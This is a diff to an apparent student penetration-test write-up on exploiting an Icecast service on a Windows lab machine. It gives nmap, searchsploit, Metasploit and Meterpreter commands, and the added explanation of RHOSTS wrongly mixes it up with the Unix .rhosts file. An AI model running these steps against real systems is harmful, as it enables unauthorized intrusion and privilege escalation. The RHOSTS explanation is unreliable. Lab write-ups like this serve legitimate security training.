@@ -29,7 +29,7 @@ Some remote actions able to be executed are:
     Key logging 
     screen capture
     Privilege escalation to Administrator 
-i also find this vulnerable to the following exploits:
+I also find this vulnerable to the following exploits:
 
     exploit/windows/local/ikeext_service
     exploit/windows/local/ms16_075_reflection
@@ -43,7 +43,9 @@ This exploit is very severe and Critical as it allows malicious actors to run an
 1. Perform a service and version scan using Nmap to determine which services are up and running: 
     nmap -sS -sV -O 192.168.0.20
 
-    
+nmap -sS it stands for TCP SYN port scan, where the -sV for is determine the version of the service running on port, and that the -O is the Remote OS detection using TCP/IP.
+After scanning networks for vulnerabilities, we can execute the exploits that we know an organization is vulnerable to.
+
     Using nmap to scan the system to see any port open
  ![using nmap to scan the system](./Images/snep-1.PNG)
 
@@ -53,24 +55,34 @@ This exploit is very severe and Critical as it allows malicious actors to run an
      searchsploit -t Icecast windows
 <Result> (exploits/windows_x86/remote/16763.rb)
 
+Now we’ll use a tool called SearchSploit to locally store a library of exploit information and the scripts used to execute the exploits.
+
+
     Icecast exploits
 ![icecast exploits](./Images/snap-2.PNG)
 
 
 3. Start Metasploit and search for the Icecast module and load it for use.:
-    msfconsole
-    search icecast
-    use 0
-    
-    starting metasploit and searching icecast
-     ![Metasploits](./Images/snap-3.PNG)
+    msfconsole.
+    search icecast.
+    use 0.
 
-     ![Metasploits](./Images/snap-y.PNG)
+The Metasploit is a computer security that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. 
+
+    starting metasploit and searching icecast
+ ![search of the recipe](./Images/snap-f.PNG)
+     
+ ![Metasploits](./Images/snap-3.PNG)
+
+ ![Metasploits](./Images/snap-y.PNG)
 
 4. Set the `RHOST` to the target machine and run.
 
     set RHOSTS 192.168.0.20
     run
+
+ Rhosts allows me to log in to a UNIX-based system from another computer on the same network.
+ The rhosts file contains a list of hosts and user names that determines who can log in to a system remotely without a password
 
     Setting RHOST to IP adress
 ![RHOST setting](./Images/snap-4.PNG)
@@ -98,8 +110,7 @@ OR
     Search of the recipe
     ![search of the recipe](./Images/snap-6.PNG)
     
-    ![search of the recipe](./Images/snap-f.PNG)
-
+    
 7. Use Meterpreter's local exploit suggester to find possible exploits.
     
     meterpreter> run post/multi/recon/local_exploit_suggestor
@@ -126,7 +137,7 @@ The system was also found to be vulnerable to the following exploits:
  ![sysinfo](./Images/snap-9.PNG)
 
  ![sysinfo](./Images/snap-a.PNG)
-
+ 
  ![sysinfo](./Images/snap-b.PNG)
 
 ### Overall Recommendations
